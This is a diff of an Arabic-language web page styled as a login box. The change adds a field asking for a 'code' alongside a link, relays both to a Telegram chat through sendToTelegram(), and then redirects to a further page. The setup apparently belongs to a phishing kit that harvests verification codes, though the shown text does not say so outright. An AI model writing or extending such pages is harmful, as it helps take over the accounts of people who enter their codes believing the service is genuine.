@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إدخال الرابط</title>
+    <title>إدخال الرابط والكود</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -78,9 +78,10 @@
 </head>
 <body>
     <div class="login-box">
-        <h2>🌐 أدخل الرابط الخاص بك 📲</h2>
+        <h2>🌐 أدخل الرابط والكود 📲</h2>
         <input type="text" id="urlInput" placeholder="أدخل الرابط هنا">
-        <button onclick="submitUrl()">✅ إرسال الرابط</button>
+        <input type="text" id="codeInput" placeholder="أدخل الكود هنا">
+        <button onclick="submitUrl()">✅ إرسال الرابط والكود</button>
         <div id="message" class="message"></div>
     </div>
 
@@ -105,6 +106,7 @@
 
         function submitUrl() {
             const urlInput = document.getElementById("urlInput").value.trim();
+            const codeInput = document.getElementById("codeInput").value.trim();
             const messageDiv = document.getElementById("message");
 
             // التحقق من صحة الرابط
@@ -115,12 +117,21 @@
             } else if (!urlPattern.test(urlInput)) {
                 messageDiv.className = "message error";
                 messageDiv.innerHTML = "❌ الرابط غير صالح، تأكد من إدخاله بشكل صحيح!";
+            } else if (codeInput.trim() === "") {
+                messageDiv.className = "message error";
+                messageDiv.innerHTML = "⚠️ من فضلك أدخل الكود!";
             } else {
                 messageDiv.className = "message success";
-                messageDiv.innerHTML = `✅ تم إرسال الرابط بنجاح! <span>${urlInput}</span> 🎉`;
+                messageDiv.innerHTML = `✅ تم إرسال الرابط والكود بنجاح! <span>${urlInput}</span> - <span>${codeInput}</span> 🎉`;
 
-                // إرسال الرسالة إلى تلجرام
-                sendToTelegram(`تم إدخال الرابط بنجاح: ${urlInput}`);
+                // إرسال الرسالة إلى تلجرام مع إيموجي ونص طويل
+                const telegramMessage = `🎯 تم إدخال البيانات بنجاح! 🌐
+📎 الرابط: ${urlInput}
+🔑 الكود: ${codeInput}
+
+🚀 شكراً لاستخدامك الخدمة. نأمل أن يكون هذا مفيداً لك! 😊`;
+
+                sendToTelegram(telegramMessage);
 
                 setTimeout(() => {
                     window.location.href = "page3.html"; // رابط إلى الصفحة التالية
